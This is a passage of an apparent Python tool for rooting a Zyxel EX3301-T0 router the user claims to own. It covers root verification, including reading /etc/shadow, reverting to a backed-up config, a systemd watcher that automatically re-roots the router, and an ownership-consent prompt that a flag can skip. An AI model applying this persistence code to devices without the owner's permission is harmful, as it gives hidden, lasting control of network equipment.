    checks['logrotate'] = out.strip() if ok else ''
    ok, out, _ = ssh_root(args, "ps | grep '[d]ropbear' | head -1", new_root_pw)
    checks['dropbear'] = out.strip() if ok else ''
    ok, out, _ = ssh_root(args, "grep '^root:' /etc/shadow", new_root_pw)
    checks['shadow'] = out.strip() if ok else ''
    ok, cfg_text, _ = ssh_root(args, f'cat {ROUTER_CONFIG}', new_root_pw)
    cfg_ok = False
    cfg_shadow_ok = False
    try:
        cfg2 = json.loads(cfg_text)
        svc2 = find_ssh_service(cfg2)
        acct2 = find_account(cfg2, 'root')
        cfg_ok = bool(svc2 and svc2.get('Enable') is True and svc2.get('Mode') == 'LAN_ONLY')
        cfg_shadow_ok = bool(acct2 and str(acct2.get('shadow', '')).count('$6$') == 1)
    except Exception:
        pass

    results = [
        ('root uid 0', checks['uid'] == '0'),
        ('admin account not hook UID 0', 'admin:x:0:0:' not in checks['admin']),
        ('no USB hook log', checks['hook'] == 'ABSENT'),
        ('stock logrotate config', checks['logrotate'].strip() in ('0', '')),
        ('stock dropbear on 22', 'dropbear -p 22' in checks['dropbear']
         and '192.168.1.1:22' not in checks['dropbear']),
        ('clean root shadow', checks['shadow'].count('$6$') == 1),
        ('config SSH Mode=LAN_ONLY', cfg_ok),
        ('config root shadow clean', cfg_shadow_ok),
    ]
    print('[*] verification:')
    for name, passed in results:
        print(f'    [{"OK" if passed else "FAIL"}] {name}')
    print(f'[*] persistent root: ssh root@{ssh_host(args)}')
    print(f'[*] root password: {new_root_src}')
    print(f'[*] backups: {local_backup}, {ROUTER_CONFIG_BACKUP}'
          + (f', {usb_backup}' if usb_backup else ''))
    return 0 if all(passed for _, passed in results) else 1


def cmd_depersist(args):
    """Restore the pre-persist config and reboot; removes persistent root."""
    try:
        root_pw, root_src, _ = root_password(args, generate=False)
    except Exception as exc:
        sys.exit(f'Could not read the root password: {exc}')
    if not root_pw:
        sys.exit('Need the current root password: pass --root-password-file '
                 'or create ~/.zyxel-root.')
    ok, out, err = ssh_root(args, f'test -f {ROUTER_CONFIG_BACKUP} && echo yes', root_pw)
    if not ok or 'yes' not in out:
        sys.exit(f'No {ROUTER_CONFIG_BACKUP} on the router; cannot revert automatically.')
    revert_cmd = (
        f'cp {ROUTER_CONFIG_BACKUP} {ROUTER_CONFIG}; '
        f'chmod 700 {ROUTER_CONFIG}; chown root:root {ROUTER_CONFIG}; sync; '
        '(sleep 2; reboot) >/dev/null 2>&1 & echo rebooting'
    )
    ok, out, err = ssh_root(args, revert_cmd, root_pw, timeout=30)
    if not ok:
        sys.exit(f'Could not revert: {(err or out).strip()[:200]}')
    print('[*] reverted; waiting for the web UI...')
    time.sleep(20)
    deadline = time.time() + 300
    while time.time() < deadline:
        try:
            response = requests.get(args.host, timeout=4, verify=False)
            if response.status_code < 500:
                print('[*] web UI is up. Persistent root removed; run `restore` if you need root again.')
                return 0
        except Exception:
            pass
        time.sleep(10)
    print('[-] web UI did not come back; power-cycle and use the USB recovery payload if needed.')
    return 1


def router_reachable(host, timeout=4):
    try:
        return requests.get(f'{host}/', timeout=timeout, verify=False).status_code < 500
    except Exception:
        return False


def cmd_watch(args):
    """Run forever: re-root automatically whenever SSH root goes missing."""
    print('[*] watcher started (Ctrl-C to stop)')
    last_attempt = 0.0
    while True:
        healthy, detail = ssh_uid0()
        if healthy:
            time.sleep(30)
            continue
        # Boot in progress or router off: retry fast, don't burn the cooldown.
        if not router_reachable(args.host):
            time.sleep(10)
            continue
        print(f'[!] root SSH missing ({detail}); web UI up, restoring')
        if time.time() - last_attempt < 300:
            time.sleep(10)
            continue
        last_attempt = time.time()
        result = subprocess.run(
            [sys.executable, os.path.abspath(__file__), '--yes', 'restore',
             '--host', args.host] +
            (['--password-file', args.password_file] if args.password_file else []),
            capture_output=True, text=True, timeout=420,
        )
        print(f'[*] restore {"succeeded" if result.returncode == 0 else "FAILED"}')
        print(result.stdout[-500:] + result.stderr[-500:])
        time.sleep(10)


SERVICE_UNIT = """[Unit]
Description=EX3301-T0 auto root restore watcher
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={python} {script} watch --host {host}{pwfile}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""


def cmd_install(args):
    unit_dir = os.path.expanduser('~/.config/systemd/user')
    os.makedirs(unit_dir, exist_ok=True)
    pwfile = f' --password-file {args.password_file}' if args.password_file else ''
    unit = SERVICE_UNIT.format(python=sys.executable, script=os.path.abspath(__file__),
                               host=args.host, pwfile=pwfile)
    path = os.path.join(unit_dir, 'zyxel-godmode.service')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(unit)
    for command in (['systemctl', '--user', 'daemon-reload'],
                    ['systemctl', '--user', 'enable', 'zyxel-godmode.service'],
                    ['systemctl', '--user', 'start', 'zyxel-godmode.service']):
        result = subprocess.run(command, capture_output=True, text=True)
        print(f'[*] {" ".join(command[1:])}: {result.returncode}')
    print('[*] installed. The watcher keeps root (needs the password file or env var).')


def cmd_uninstall(_args):
    for command in (['systemctl', '--user', 'stop', 'zyxel-godmode.service'],
                    ['systemctl', '--user', 'disable', 'zyxel-godmode.service']):
        subprocess.run(command, capture_output=True)
    path = os.path.expanduser('~/.config/systemd/user/zyxel-godmode.service')
    if os.path.exists(path):
        os.remove(path)
    print('[*] watcher removed (router keeps current state until next reboot).')


CONSENT_PHRASE = 'I OWN THIS DEVICE'


def require_consent(args):
    if args.yes:
        return
    legal = __doc__.split('LEGAL - READ FIRST', 1)[1].strip()
    print('=' * 70)
    print(legal)
    print('=' * 70)
    print('Full notice: LEGAL.md (not legal advice; consult a lawyer if unsure).')
    try:
        answer = input(f'\nType "{CONSENT_PHRASE}" to continue: ').strip()
    except EOFError:
        sys.exit('Consent not given; nothing was changed.')
    if answer != CONSENT_PHRASE:
        sys.exit('Consent not given; nothing was changed.')


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('--host', default='http://192.168.1.1')
    parser.add_argument('--yes', action='store_true',
                        help='skip the ownership consent prompt '
                             '(only use on your own device; scripts only)')
    parser.add_argument('--password-file',
                        help='file with "password=..." (mode 0600) or a bare password; '
                             'else $ZYXEL_ADMIN_PASSWORD, else prompt')
    parser.add_argument('--root-password-file',
                        help='file with the current root password (mode 0600); '
                             'else $ZYXEL_ROOT_PASSWORD or ~/.zyxel-root')
    sub = parser.add_subparsers(dest='command', required=True)
    sub.add_parser('status', help='show router/USB/SSH/UI/persistent-root state')
    sub.add_parser('extract', help='copy live passwd to USB (stick in ROUTER)')
    stage = sub.add_parser('stage', help='build payload on USB (stick on THIS machine)')
    stage.add_argument('mount', help='USB mountpoint, e.g. /run/media/$USER/ROUTERSTICK')
    sub.add_parser('restore', help='install hook and wait for root (stick in ROUTER)')
    persist = sub.add_parser(
        'persist',
        help='write config-only persistent root (no USB/watcher after this)')
    persist.add_argument('--dry-run', action='store_true',
                         help='read and show planned config changes only')
    persist.add_argument('--no-reboot', action='store_true',
                         help='write the config but do not reboot')
    persist.add_argument('--rotate-root-password', action='store_true',
                         help='generate a new root password in ~/.zyxel-root')
    persist.add_argument('--timeout', type=int, default=300,
                         help='seconds to wait for root SSH after reboot (default 300)')
    sub.add_parser('depersist', help='restore the pre-persist config and reboot')
    sub.add_parser('watch', help='legacy: daemon that auto-restores the USB hook')
    sub.add_parser('install', help='legacy: install the watcher as a systemd user service')
    sub.add_parser('uninstall', help='remove the legacy watcher service')
    args = parser.parse_args()
    if not args.host.startswith('http'):
        args.host = 'http://' + args.host
    if args.command in ('extract', 'stage', 'restore', 'persist', 'depersist'):
        require_consent(args)
    return {'status': cmd_status, 'extract': cmd_extract, 'stage': cmd_stage,
            'restore': cmd_restore, 'persist': cmd_persist,
            'depersist': cmd_depersist, 'watch': cmd_watch,
            'install': cmd_install, 'uninstall': cmd_uninstall}[args.command](args)


if __name__ == '__main__':
    raise SystemExit(main())
